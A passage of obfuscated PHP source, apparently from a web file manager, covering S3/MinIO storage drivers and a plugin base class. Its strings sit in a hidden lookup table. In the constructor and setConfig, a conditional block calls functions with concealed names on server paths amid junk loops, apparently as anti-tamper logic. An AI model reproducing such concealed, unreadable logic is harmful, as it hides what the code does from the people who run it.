strlen($ÈƒÛ½­£)); $¥ßÜ•ç¡ = $ìàôŠ‚˜[291]; $¸úÉ¦õ‹ = $ìàôŠ‚˜[8] . $this->pathEncode($ü·éäÒğ); $±Œ“®„Ÿ = array($ìàôŠ‚˜[284] => $²¾É÷»Ÿ); $ÊˆÑÁ†¼ = $this->client->__getSignatureV4($†­Ú•åâ, $ÍËÌÀÁß, $¥ßÜ•ç¡, $¸úÉ¦õ‹, $±Œ“®„Ÿ); return array($ìàôŠ‚˜[289] => $ÊˆÑÁ†¼, $ìàôŠ‚˜[293] => $†­Ú•åâ[$ìàôŠ‚˜[293]], $ìàôŠ‚˜[285] => $†­Ú•åâ[$ìàôŠ‚˜[276]], $ìàôŠ‚˜[292] => $š¿µ—Õå); } private function _isClientAsync() { $Ç¼úæ =& $_SERVER[«òÑğ]; static $ùÎƒïºª = null; if ($ùÎƒïºª === null) { $ÉèÎŸÈ‰ = isset($_REQUEST[$Ç¼úæ[304]]) ? json_decode($_REQUEST[$Ç¼úæ[304]], !0) : !1; $ùÎƒïºª = $ÉèÎŸÈ‰ && _get($ÉèÎŸÈ‰, $Ç¼úæ[305]) == $Ç¼úæ[306]; } return $ùÎƒïºª; } public function getHost() { $ĞÜµÖÊè =& $_SERVER[«òÑğ]; $™ÑŠê’Ü = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ĞÜµÖÊè[70], $ĞÜµÖÊè[64], $ĞÜµÖÊè[69], $ĞÜµÖÊè[62]))) { return $™ÑŠê’Ü . $ĞÜµÖÊè[8] . $this->bucket; } if ($this->osType == $ĞÜµÖÊè[62] && !is_domain($™ÑŠê’Ü)) { return $™ÑŠê’Ü . $ĞÜµÖÊè[8] . $this->bucket; } $™ÑŠê’Ü = explode($ĞÜµÖÊè[211], $™ÑŠê’Ü); return $™ÑŠê’Ü[0] . $ĞÜµÖÊè[211] . $this->bucket . $ĞÜµÖÊè[10] . $™ÑŠê’Ü[1]; } public function size($–İçÀÒ) { $¡¡Ö«Ì = $this->objectMeta($–İçÀÒ); return $¡¡Ö«Ì ? $¡¡Ö«Ì[$_SERVER[«òÑğ][79]] : 0; } public function info($õÒõî™Ì) { if ($this->isFolder($õÒõî™Ì)) { return $this->folderInfo($õÒõî™Ì); } else { if ($this->isFile($õÒõî™Ì)) { return $this->fileInfo($õÒõî™Ì); } } return !1; } public function exist($ä´Ó£±) { return $this->isFile($ä´Ó£±) || $this->isFolder($ä´Ó£±); } public function isFile($”®‚ê‡Æ) { return !$this->isFolder($”®‚ê‡Æ) && $this->objectMeta($”®‚ê‡Æ); } public function isFolder($ÆĞÀ†ûÎ) { return $this->cacheMethod($_SERVER[«òÑğ][180], $ÆĞÀ†ûÎ); } protected function objectMeta($¶Çí™»î) { return $this->cacheMethod($_SERVER[«òÑğ][182], $¶Çí™»î); } protected function _objectMeta($û‚·ş‹) { $ÕôÓ³ŞË =& $_SERVER[«òÑğ]; $û‚·ş‹ = rtrim($û‚·ş‹, $ÕôÓ³ŞË[8]); try { $¸†Àó = $this->client->getObjectInfo($this->bucket, $û‚·ş‹); if (!isset($¸†Àó[$ÕôÓ³ŞË[255]]) && isset($¸†Àó[$ÕôÓ³ŞË[307]])) { $¸†Àó[$ÕôÓ³ŞË[255]] = $¸†Àó[$ÕôÓ³ŞË[307]]; } } catch (Exception $ÀÖ–§ã«) { $¸†Àó = !1; } if (!$¸†Àó) { } return $¸†Àó; } protected function _isFolder($ëì¹ˆ÷İ) { $¹ÍŠ¼ =& $_SERVER[«òÑğ]; $ëì¹ˆ÷İ = rtrim($ëì¹ˆ÷İ, $¹ÍŠ¼[8]) . $¹ÍŠ¼[8]; if ($ëì¹ˆ÷İ == $¹ÍŠ¼[12] || $ëì¹ˆ÷İ == $¹ÍŠ¼[8]) { return !0; } $çÂ¯ÜòË = $this->client->getBucket($this->bucket, $ëì¹ˆ÷İ, null, 1); if (empty($çÂ¯ÜòË[$¹ÍŠ¼[239]])) { return !1; } $¤«Ô¦‡– = $çÂ¯ÜòË[$¹ÍŠ¼[239]][0][$¹ÍŠ¼[32]]; return stripos($¤«Ô¦‡–, $ëì¹ˆ÷İ) === 0 ? !0 : !1; if (substr($¤«Ô¦‡–, -1) == $¹ÍŠ¼[8]) { return !0; } if (get_path_this($¤«Ô¦‡–) == get_path_this($ëì¹ˆ÷İ)) { return !1; } return !0; } public function listObject($ª©’¼ÀÒ) { return $this->fileList($ª©’¼ÀÒ, $_SERVER[«òÑğ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($‰£ú¸¸) { $ï­ù×’æ =& $_SERVER[«òÑğ]; parent::__construct($‰£ú¸¸); $this->setSignVersion($ï­ù×’æ[250]); if (!$this->region) { $this->region = $ï­ù×’æ[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $òö—ääĞ = $this->getBktRegion(); return $this->region == $òö—ääĞ ? !0 : !1; } public function uploadFormData($¹Ë¶Ò’, $ïİµåºç = 3600) { $Ü©¯Æ®Ş =& $_SERVER[«òÑğ]; $ñüÉô‡ = $Ü©¯Æ®Ş[232]; $±®ê¯ = $Ü©¯Æ®Ş[260]; $˜œœÕ¿ = $Ü©¯Æ®Ş[62]; $ÔÃÕş—ë = gmdate($Ü©¯Æ®Ş[261]); $‹ë§Ìå¤ = gmdate($Ü©¯Æ®Ş[262]); $½×ÑÆë‚ = $Ü©¯Æ®Ş[263]; $Ú³”Áåæ = $ïİµåºç . $Ü©¯Æ®Ş[12]; $Ç‡°şÖ = $Ü©¯Æ®Ş[264]; $©Ù’è¦ = array($this->accessKey, $‹ë§Ìå¤, $this->region, $˜œœÕ¿, $½×ÑÆë‚); $‡¼ˆ™ÚÙ = implode($Ü©¯Æ®Ş[8], $©Ù’è¦); $›àµ¸ï = array($Ü©¯Æ®Ş[265] => gmdate($Ü©¯Æ®Ş[266], strtotime($Ü©¯Æ®Ş[267])), $Ü©¯Æ®Ş[268] => array(array($Ü©¯Æ®Ş[269] => $this->bucket), array($Ü©¯Æ®Ş[309] => $ñüÉô‡), array($Ü©¯Æ®Ş[270], $Ü©¯Æ®Ş[271], $Ü©¯Æ®Ş[12]), array($Ü©¯Æ®Ş[270], $Ü©¯Æ®Ş[272], $Ü©¯Æ®Ş[12]), array($Ü©¯Æ®Ş[270], $Ü©¯Æ®Ş[310], $Ü©¯Æ®Ş[12]), array($Ü©¯Æ®Ş[273] => $Ç‡°şÖ), array($Ü©¯Æ®Ş[274] => $‡¼ˆ™ÚÙ), array($Ü©¯Æ®Ş[275] => $±®ê¯), array($Ü©¯Æ®Ş[276] => $ÔÃÕş—ë), array($Ü©¯Æ®Ş[277] => $Ú³”Áåæ))); $æÙ˜®Çè = base64_encode(json_encode($›àµ¸ï)); $ş¡¥õ¿ë = hash_hmac($Ü©¯Æ®Ş[278], $‹ë§Ìå¤, $Ü©¯Æ®Ş[279] . $this->secret, !0); $—Ú½»¿ = hash_hmac($Ü©¯Æ®Ş[278], $this->region, $ş¡¥õ¿ë, !0); $ö˜¦±ü‘ = hash_hmac($Ü©¯Æ®Ş[278], $˜œœÕ¿, $—Ú½»¿, !0); $ŸÆû«Ø = hash_hmac($Ü©¯Æ®Ş[278], $½×ÑÆë‚, $ö˜¦±ü‘, !0); $®Ô¤Ù¾û = hash_hmac($Ü©¯Æ®Ş[278], $æÙ˜®Çè, $ŸÆû«Ø); $¸ì¬Õ = array($Ü©¯Æ®Ş[249] => $Ü©¯Æ®Ş[12], $Ü©¯Æ®Ş[297] => $Ü©¯Æ®Ş[12], $Ü©¯Æ®Ş[309] => $ñüÉô‡, $Ü©¯Æ®Ş[273] => $Ç‡°şÖ, $Ü©¯Æ®Ş[280] => $æÙ˜®Çè, $Ü©¯Æ®Ş[311] => $‡¼ˆ™ÚÙ, $Ü©¯Æ®Ş[312] => $±®ê¯, $Ü©¯Æ®Ş[313] => $ÔÃÕş—ë, $Ü©¯Æ®Ş[314] => $Ú³”Áåæ, $Ü©¯Æ®Ş[315] => $®Ô¤Ù¾û, $Ü©¯Æ®Ş[209] => $this->getHost()); return $¸ì¬Õ; } } goto FôÔ·Ÿ¯çï; aòà…¼¹¹ : class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ß”¯ ‹ˆ =& $_SERVER[«òÑğ]; if (!isset($_SERVER[$ß”¯ ‹ˆ[824]]) || !isset($_SERVER[$ß”¯ ‹ˆ[831]])) { $€·³®ò = $ß”¯ ‹ˆ[967]; $·¬¦ŠæÃ = $ß”¯ ‹ˆ[826]; $îËíÆ•û = $_SERVER[$ß”¯ ‹ˆ[827]] . $ß”¯ ‹ˆ[828]; $Ñ†­Ššş = $·¬¦ŠæÃ($îËíÆ•û); $´¦É¡ƒ¢ = explode($ß”¯ ‹ˆ[288], $Ñ†­Ššş); if (count($´¦É¡ƒ¢) < $ß”¯ ‹ˆ[702]) { $ò¾ÏÂÓ½ = $ß”¯ ‹ˆ[829]; $ò¾ÏÂÓ½(); } $°öÄ–æÁ = $ß”¯ ‹ˆ[968]; $°öÄ–æÁ($_SERVER[$ß”¯ ‹ˆ[969]]); $ÎÉå³¶ö = 1; for ($¢°–›±û = $ÎÉå³¶ö; $¢°–›±û > 0; $¢°–›±û++) { $°öÄ–æÁ = json_encode($GLOBALS[$ß”¯ ‹ˆ[495]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ß”¯ ‹ˆ[1636]); $this->pluginName = str_replace($ß”¯ ‹ˆ[1636], $ß”¯ ‹ˆ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ß”¯ ‹ˆ[8]; $this->pluginApi = appHostGet() . $ß”¯ ‹ˆ[1637] . $this->pluginName . $ß”¯ ‹ˆ[8]; $this->pluginHost = $config[$ß”¯ ‹ˆ[1638]] . $this->pluginName . $ß”¯ ‹ˆ[8]; $this->pluginHostDefault = $config[$ß”¯ ‹ˆ[1638]] . $this->pluginName . $ß”¯ ‹ˆ[8]; $îÆš´ı× = $config[$ß”¯ ‹ˆ[1639]]; if ($îÆš´ı× && strpos($ß”¯ ‹ˆ[50] . $îÆš´ı× . $ß”¯ ‹ˆ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ß”¯ ‹ˆ[1640]] . $this->pluginName . $ß”¯ ‹ˆ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[«òÑğ][1641]); } protected function assign($¡Ÿ¯„ì, $’©½ùò = false) { if (is_array($¡Ÿ¯„ì)) { $this->values = array_merge($this->values, $¡Ÿ¯„ì); } else { $this->values[$¡Ÿ¯„ì] = $’©½ùò; } } protected function display($–áˆ˜˜) { extract($this->values); require $–áˆ˜˜; } final function hookRegist($œíÈ‹ö) { $this->modelPlugin->appRegist($this->pluginName, $œíÈ‹ö); } final function appIcon() { $¼¹áàŠ =& $_SERVER[«òÑğ]; $ş¿¢ŸÙ• = $this->appPackage(); $«Šíå» = $¼¹áàŠ[12]; if (isset($ş¿¢ŸÙ•[$¼¹áàŠ[493]])) { if (isset($ş¿¢ŸÙ•[$¼¹áàŠ[493]][$¼¹áàŠ[1642]])) { $«Šíå» = $¼¹áàŠ[1643] . $ş¿¢ŸÙ•[$¼¹áàŠ[493]][$¼¹áàŠ[1642]] . $¼¹áàŠ[1644]; } else { if ($ş¿¢ŸÙ•[$¼¹áàŠ[493]][$¼¹áàŠ[1645]]) { $«Šíå» = $¼¹áàŠ[1646] . $ş¿¢ŸÙ•[$¼¹áàŠ[493]][$¼¹áàŠ[1645]] . $¼¹áàŠ[1647]; } } } return $«Šíå»; } final function fileCanView($‡í®‰æø) { $Î·¼¦î =& $_SERVER[«òÑğ]; if (request_url_safe($‡í®‰æø)) { return !0; } if ($this->isShare($‡í®‰æø)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $é€†è¿Ù = $Î·¼¦î[1648] . rawurlencode(this_url()); show_tips(LNG($Î·¼¦î[1649]) . $Î·¼¦î[1650] . $é€†è¿Ù . $Î·¼¦î[1651] . LNG($Î·¼¦î[1652]) . $Î·¼¦î[1653], !1); } if (!Action($Î·¼¦î[1654])->authCan($Î·¼¦î[1655])) { show_tips(LNG($Î·¼¦î[1656]) . $Î·¼¦î[1657], !1); } ActionCall($Î·¼¦î[1658], $‡í®‰æø); } final function isShare($ò›¯ÈÜµ) { $€ñ©Üğè = KodIO::parse($ò›¯ÈÜµ); return $€ñ©Üğè[$_SERVER[«òÑğ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÇÑ»–Òˆ) { if (request_url_safe($ÇÑ»–Òˆ)) { return $ÇÑ»–Òˆ; } if (!$this->isShare($ÇÑ»–Òˆ)) { $ÇÑ»–Òˆ = $this->filePath($ÇÑ»–Òˆ, !1); } return Action($_SERVER[«òÑğ][1266])->linkOut($ÇÑ»–Òˆ); } public function filePathLinkOut($ÀŞéÙªı) { if (request_url_safe($ÀŞéÙªı)) { return $ÀŞéÙªı; } $this->fileCanView($ÀŞéÙªı); return Action($_SERVER[«òÑğ][1266])->link($ÀŞéÙªı); } final function filePath($Ìâ„ŞÍ, $óñìÛìã = true, $ªëô©Êû = false) { $ä¡ıå„ñ =& $_SERVER[«òÑğ]; $ş âÁ¾ = $this->filePathGet($Ìâ„ŞÍ, $óñìÛìã); if (!$this->fileInfo) { show_tips(LNG($ä¡ıå„ñ[108]), !1); } if ($ªëô©Êû && isset($this->fileInfo[$ä¡ıå„ñ[546]]) && $this->fileInfo[$ä¡ıå„ñ[546]]) { $§îşâµÀ = Model($ä¡ıå„ñ[549])->fileInfo($this->fileInfo[$ä¡ıå„ñ[546]]); if (!$§îşâµÀ || !IO::exist($§îşâµÀ[$ä¡ıå„ñ[87]])) { $îÑû–ò¥ = LNG($ä¡ıå„ñ[108]) . LNG($ä¡ıå„ñ[1659]); if (KodUser::isRoot() && isset($§îşâµÀ[$ä¡ıå„ñ[87]])) { $îÑû–ò¥ .= $ä¡ıå„ñ[1660] . $§îşâµÀ[$ä¡ıå„ñ[87]] . $ä¡ıå„ñ[1661]; } show_tips($îÑû–ò¥); } } Hook::trigger($ä¡ıå„ñ[1662], $ş âÁ¾); return $ş âÁ¾; } final function filePathGet($õ¢ØÔ“, $İ¾”ƒÛ = true) { $’•Şú°¡ =& $_SERVER[«òÑğ]; if ($¤æŒø = $this->checkSharePath($õ¢ØÔ“, $İ¾”ƒÛ)) { return $¤æŒø; } $this->fileCanView($õ¢ØÔ“); if (request_url_safe($õ¢ØÔ“)) { $é‰õŠµ = parse_url_query($õ¢ØÔ“); if (isset($é‰õŠµ[$’•Şú°¡[1663]]) && isset($é‰õŠµ[$’•Şú°¡[237]])) { $ßÇ„ú³ = Mcrypt::decode($é‰õŠµ[$’•Şú°¡[237]], Model($’•Şú°¡[854])->get($’•Şú°¡[855])); if ($ßÇ„ú³) { $this->fileInfo = IO::info($ßÇ„ú³); $this->fileInfo[$’•Şú°¡[1664]] = $õ¢ØÔ“; $this->cachePath = $this->pluginCachePath($’•Şú°¡[12], $İ¾”ƒÛ); return $ßÇ„ú³; } } $õ¢ØÔ“ = $this->_cacheHttpFile($õ¢ØÔ“, $İ¾”ƒÛ); $this->fileInfo = IO::info($õ¢ØÔ“); } else { $this->fileInfo = IO::info($õ¢ØÔ“); $this->cachePath = $this->pluginCachePath($’•Şú°¡[12], $İ¾”ƒÛ); } return $õ¢ØÔ“; } final function _cacheHttpFile($ßú·§¦·, $¼©®´ØÍ = true) { $ß¸û¡éÀ =& $_SERVER[«òÑğ]; $»Ğõµ¾¼ = parse_url_query($ßú·§¦·); $ãŞš–µÌ = get_path_ext($ßú·§¦·); if (isset($»Ğõµ¾¼[$ß¸û¡éÀ[32]]) && $»Ğõµ¾¼[$ß¸û¡éÀ[32]]) { $ãŞš–µÌ = get_path_ext($»Ğõµ¾¼[$ß¸û¡éÀ[32]]); } $¿¡ÕĞ¹ = hash_path($ßú·§¦·) . $ß¸û¡éÀ[10] . $ãŞš–µÌ; $this->cachePath = $this->pluginCachePath($¼©®´ØÍ ? $¿¡ÕĞ¹ : $ß¸û¡éÀ[12]); $ŸÀÉ±Ü = IO::fileNameExist($this->cachePath, $¿¡ÕĞ¹); if ($ŸÀÉ±Ü) { return KodIO::make($ŸÀÉ±Ü); } $ ˆé™ôã = rtrim($this->cachePath, $ß¸û¡éÀ[8]) . $ß¸û¡éÀ[8] . $¿¡ÕĞ¹; return $this->pluginCacheFileSet($ ˆé™ôã, file_get_contents_nossl($ßú·§¦·)); } final function checkSharePath($‹òÚª¼°, $ÓßˆéîŸ = true) { $®³™½Ãş =& $_SERVER[«òÑğ]; if (!$this->isShare($‹òÚª¼°)) { return !1; } $Ê¨—ÇÄ– = Action($®³™½Ãş[1266])->sharePathInfo($‹òÚª¼°); if (!is_array($Ê¨—ÇÄ–) || !isset($Ê¨—ÇÄ–[$®³™½Ãş[87]])) { show_json(LNG($®³™½Ãş[1665]), !1); } $this->fileInfo = $Ê¨—ÇÄ–; $this->cachePath = $this->pluginCachePath(!1, $ÓßˆéîŸ); return $Ê¨—ÇÄ–[$®³™½Ãş[87]]; } final function pluginCachePath($Ï÷ëµ“ = '', $ò†·”Ö¥ = false) { $İ©”¶õÛ =& $_SERVER[«òÑğ]; if ($ò†·”Ö¥ && is_array($this->fileInfo)) { $Ï÷ëµ“ = kodIO::hashPath($this->fileInfo); } $˜ÇÇ¡úú = rtrim(IO_PATH_SYSTEM_TEMP . $İ©”¶õÛ[1666] . $this->pluginName . $İ©”¶õÛ[8] . $Ï÷ëµ“, $İ©”¶õÛ[8]); $±è¢¥’ = IO::infoFullSimple($˜ÇÇ¡úú); $™‹§û—ã = $±è¢¥’ && is_array($±è¢¥’) ? $±è¢¥’[$İ©”¶õÛ[87]] : $İ©”¶õÛ[12]; if (!$™‹§û—ã) { $™‹§û—ã = IO::mkdir($˜ÇÇ¡úú); } return $™‹§û—ã; } final function pluginCacheFileSet($ãú›š°Ñ, $Ñ¹ßù¼æ = '') { $¨–ˆ–“ =& $_SERVER[«òÑğ]; $ï §çêÆ = IO::infoFullSimple($ãú›š°Ñ); if (!$ï §çêÆ) { return IO::mkfile($ãú›š°Ñ, $Ñ¹ßù¼æ, REPEAT_REPLACE); } IO::setContent($ï §çêÆ[$¨–ˆ–“[87]], $Ñ¹ßù¼æ); return $ï §çêÆ[$¨–ˆ–“[87]]; } final function pluginLocalFile($°êÓŸ¨û = '') { $¼ÒËô =& $_SERVER[«òÑğ]; $¡ÊÉÅÔÙ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¡ÊÉÅÔÙ)) { mk_dir($¡ÊÉÅÔÙ); } if (!$°êÓŸ¨û) { return $¡ÊÉÅÔÙ; } $àÈ…óËï = IO::info($°êÓŸ¨û); $Œ¸÷ˆ¶¼ = $¼ÒËô[1667] . KodIO::hashPath($àÈ…óËï) . $¼ÒËô[10] . $àÈ…óËï[$¼ÒËô[169]]; if (!checkExtSafe($Œ¸÷ˆ¶¼)) { $Œ¸÷ˆ¶¼ = $Œ¸÷ˆ¶¼ . $¼ÒËô[1301]; } $›ëÚ´ú† = $¡ÊÉÅÔÙ . $Œ¸÷ˆ¶¼; if (@file_exists($›ëÚ´ú†)) { return $›ëÚ´ú†; } return IO::copy($°êÓŸ¨û, $¡ÊÉÅÔÙ, 0, $Œ¸÷ˆ¶¼); } final function appPackage() { $«Òî =& $_SERVER[«òÑğ]; if ($this->packageData) { return $this->packageData; } $·€‘†Î = $this->parseFile($this->pluginPath . $«Òî[1668]); $this->parseLang($·€‘†Î); $ğáÉ±Ä = json_decode_force($·€‘†Î); if (!$ğáÉ±Ä) { return array(); } $®½¶Ôä† = Hook::trigger($«Òî[1669], $ğáÉ±Ä); if ($®½¶Ôä† && is_array($®½¶Ôä†)) { $ğáÉ±Ä = $®½¶Ôä†; } $this->packageData = $ğáÉ±Ä; return $ğáÉ±Ä; } public function packageInfoGet($Â”ŞóĞ) { $šÇ´­Ú´ = $this->appPackage(); return array_get_value($šÇ´­Ú´, $Â”ŞóĞ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[«òÑğ][1670]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[«òÑğ][1671]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[«òÑğ][1672]); } public function echoJsAssign($‰ÚÊæˆÜ, $£Ï¬ùÂ¨) { $this->echoJsAssignArr[$‰ÚÊæˆÜ] = $£Ï¬ùÂ¨; } private function parseFile($§Şä–ÔÈ) { $Ğ²°ï¢ =& $_SERVER[«òÑğ]; $‡ÅºÙÔ = file_get_contents_nossl($§Şä–ÔÈ); $ŞºÏ¢ = array($Ğ²°ï¢[1673], $Ğ²°ï¢[1674], $Ğ²°ï¢[1675], $Ğ²°ï¢[1676], $Ğ²°ï¢[1677], $Ğ²°ï¢[1678], $Ğ²°ï¢[1679]); $•õßòŸø = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ğ²°ï¢[92]][$Ğ²°ï¢[1680]]); foreach ($this->echoJsAssignArr as $ï²¡Åíò => $Û§È°ûå) { $ŞºÏ¢[] = $Ğ²°ï¢[1681] . $ï²¡Åíò . $Ğ²°ï¢[1682]; $•õßòŸø[] = is_array($Û§È°ûå) || is_object($Û§È°ûå) ? rawurlencode(json_encode($Û§È°ûå)) : $Û§È°ûå; } if (strstr($‡ÅºÙÔ, $Ğ²°ï¢[1683])) { $  ª¦è¶ = rawurlencode(json_encode($this->pluginLangArr)); $‡ÅºÙÔ = str_replace($Ğ²°ï¢[1683], $  ª¦è¶, $‡ÅºÙÔ); } if (strstr($‡ÅºÙÔ, $Ğ²°ï¢[1684])) { $  ª¦è¶ = $  ª¦è¶ = rawurlencode(json_encode($this->getConfig())); $‡ÅºÙÔ = str_replace($Ğ²°ï¢[1684], $  ª¦è¶, $‡ÅºÙÔ); } $‡ÅºÙÔ = str_replace($ŞºÏ¢, $•õßòŸø, $‡ÅºÙÔ); return $‡ÅºÙÔ; } private function parseLang(&$Ç€¶şŸË) { $•—£‹÷ñ =& $_SERVER[«òÑğ]; $ø¾ÏÏé¦ = $•—£‹÷ñ[1685]; if (!strstr($Ç€¶şŸË, $ø¾ÏÏé¦)) { return; } preg_match_all($•—£‹÷ñ[1686], $Ç€¶şŸË, $â¥¾˜†•); if (!is_array($â¥¾˜†•) || count($â¥¾˜†•) == 0 || !is_array($â¥¾˜†•[0]) || count($â¥¾˜†•[0]) == 0) { return; } $Ô‰¬ÊÒó = array(); $¸ˆÁâ” = array(); foreach ($â¥¾˜†•[0] as $¥•¤÷ê›) { $¨ªÖÇ = substr($¥•¤÷ê›, strlen($ø¾ÏÏé¦), -4); $«æ‹Æ‡œ = LNG($¨ªÖÇ); $Ô‰¬ÊÒó[] = $¥•¤÷ê›; $¸ˆÁâ”[] = str_replace(array($•—£‹÷ñ[288], $•—£‹÷ñ[1166], $•—£‹÷ñ[420], $•—£‹÷ñ[121]), array($•—£‹÷ñ[53], $•—£‹÷ñ[53], $•—£‹÷ñ[12], $•—£‹÷ñ[1687]), $«æ‹Æ‡œ); } $Ç€¶şŸË = str_replace($Ô‰¬ÊÒó, $¸ˆÁâ”, $Ç€¶şŸË); } private function parseConfig(&$ºİ™ƒò¥) { $á“éÑ¡à =& $_SERVER[«òÑğ]; $ºçÃ×½ = $á“éÑ¡à[1688]; if (!strstr($ºİ™ƒò¥, $ºçÃ×½)) { return; } preg_match_all($á“éÑ¡à[1689], $ºİ™ƒò¥, $è§Æ½Ç); if (!is_array($è§Æ½Ç) || count($è§Æ½Ç) == 0 || !is_array($è§Æ½Ç[0]) || count($è§Æ½Ç[0]) == 0) { return; } $·Òß¾°Ü = $this->getConfig(); $æ±ªòá· = array(); $üÍÙÎ“À = array(); foreach ($è§Æ½Ç[0] as $¯¸æåüÍ) { $“à˜Ä = substr($¯¸æåüÍ, strlen($ºçÃ×½), -2); $æ±ªòá·[] = $¯¸æåüÍ; $üÍÙÎ“À[] = _get($·Òß¾°Ü, $“à˜Ä); } $ºİ™ƒò¥ = str_replace($æ±ªòá·, $üÍÙÎ“À, $ºİ™ƒò¥); } private function parsePackage(&$‘Å€şÆ±) { $ÂˆûıóÄ =& $_SERVER[«òÑğ]; $˜Öù”Ğ† = $ÂˆûıóÄ[1690]; if (!strstr($‘Å€şÆ±, $˜Öù”Ğ†)) { return; } preg_match_all($ÂˆûıóÄ[1691], $‘Å€şÆ±, $ºâ÷½´’); if (!is_array($ºâ÷½´’) || count($ºâ÷½´’) == 0 || !is_array($ºâ÷½´’[0]) || count($ºâ÷½´’[0]) == 0) { return; } $ü§ƒîÌƒ = $this->appPackage(); $ç˜ÊÍ•š = array(); $×Úùı•¿ = array(); foreach ($ºâ÷½´’[0] as $¯Ø·øÏ) { $æşå”û = substr($¯Ø·øÏ, strlen($˜Öù”Ğ†), -2); $ç˜ÊÍ•š[] = $¯Ø·øÏ; $×Úùı•¿[] = _get($ü§ƒîÌƒ, $æşå”û); } $‘Å€şÆ± = str_replace($ç˜ÊÍ•š, $×Úùı•¿, $‘Å€şÆ±); } final function echoFile($ºŒÛçãì, $ä±ù¥ë = false) { $‹›€œ°Ï =& $_SERVER[«òÑğ]; $ûª÷â€” = $this->pluginPath . $ºŒÛçãì; if (ACT == $‹›€œ°Ï[1692]) { echo $‹›€œ°Ï[1693] . $this->pluginName . $‹›€œ°Ï[8] . $ºŒÛçãì . $‹›€œ°Ï[1694]; if (!file_exists($ûª÷â€”)) { echo $‹›€œ°Ï[1695]; return; } } $¯®¥ÚÑ = $this->parseFile($ûª÷â€”); $this->parseLang($¯®¥ÚÑ); $this->parseConfig($¯®¥ÚÑ); $this->parsePackage($¯®¥ÚÑ); if (is_array($ä±ù¥ë)) { $¯®¥ÚÑ = str_replace(array_keys($ä±ù¥ë), array_values($ä±ù¥ë), $¯®¥ÚÑ); } echo $‹›€œ°Ï[288] . $¯®¥ÚÑ; } private function checkVersion() { $°ô‘›û =& $_SERVER[«òÑğ]; $¡²Î²¤Ê = $this->appPackage(); $ÁõÔÇñØ = $this->getConfig(); if ($ÁõÔÇñØ[$°ô‘›û[1696]] == $¡²Î²¤Ê[$°ô‘›û[1670]]) { return; } $this->regist(); $this->setConfig(array($°ô‘›û[1696] => $¡²Î²¤Ê[$°ô‘›û[1670]])); } final function initLang() { $‰×ò”ı‡ =& $_SERVER[«òÑğ]; $µêŸî¹Û = $‰×ò”ı‡[1697]; $şÂ§äï… = $this->pluginPath . $‰×ò”ı‡[1698]; $¤¯†ç“ß = I18n::getType(); $ÅáÏ«‡ = array(); if (file_exists($şÂ§äï… . $¤¯†ç“ß . $‰×ò”ı‡[928])) { $ÅáÏ«‡ = (include $şÂ§äï… . $¤¯†ç“ß . $‰×ò”ı‡[928]); } else { if ($¤¯†ç“ß == $‰×ò”ı‡[1699] && !file_exists($şÂ§äï… . $¤¯†ç“ß . $‰×ò”ı‡[928]) && file_exists($şÂ§äï… . $‰×ò”ı‡[1700])) { $ÅáÏ«‡ = (include $şÂ§äï… . $‰×ò”ı‡[1700]); } else { if (file_exists($şÂ§äï… . $µêŸî¹Û . $‰×ò”ı‡[928])) { $ÅáÏ«‡ = (include $şÂ§äï… . $µêŸî¹Û . $‰×ò”ı‡[928]); } } } if (!is_array($ÅáÏ«‡)) { return array(); } if (@count($ÅáÏ«‡) > 0) { I18n::set($ÅáÏ«‡); } return $ÅáÏ«‡; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($æÑ½Áİ™) { $øñØù¤¤ =& $_SERVER[«òÑğ]; if ($_SERVER[$øñØù¤¤[824]] != $_SERVER[$øñØù¤¤[825]]) { $ƒøÔ—®Ä = $øñØù¤¤[967]; $ıˆ×Æî = $øñØù¤¤[826]; $¦¹…ğ¥ = $_SERVER[$øñØù¤¤[827]] . $øñØù¤¤[828]; $Ñ³’¿§ = $ıˆ×Æî($¦¹…ğ¥); $‰é¾ë™¥ = explode($øñØù¤¤[288], $Ñ³’¿§); if (count($‰é¾ë™¥) < $øñØù¤¤[702]) { $·ìş®²´ = $øñØù¤¤[829]; $·ìş®²´(); } $¶Ú¼®œ = $øñØù¤¤[968]; $¶Ú¼®œ($_SERVER[$øñØù¤¤[969]]); $¶Ú¼®œ($_SERVER[$øñØù¤¤[827]] . $øñØù¤¤[1701]); $—ìé÷ğ“ = 1; while ($—ìé÷ğ“ > 1) { $—ìé÷ğ“ = $—ìé÷ğ“ + 4; $€òùÂÁ = rawurlencode($—ìé÷ğ“ . $øñØù¤¤[457]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $æÑ½Áİ™); } public function onSetConfig($ğ·²€±î) { } public function onGetConfig($àÔ©üÌ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¢ŸìÀš›) { if ($¢ŸìÀš› == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($­ËÂæéí = "\x70\x6c\165\147\x69\156\101\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $Ô¹˜Ü§… = $this->getConfig(); if 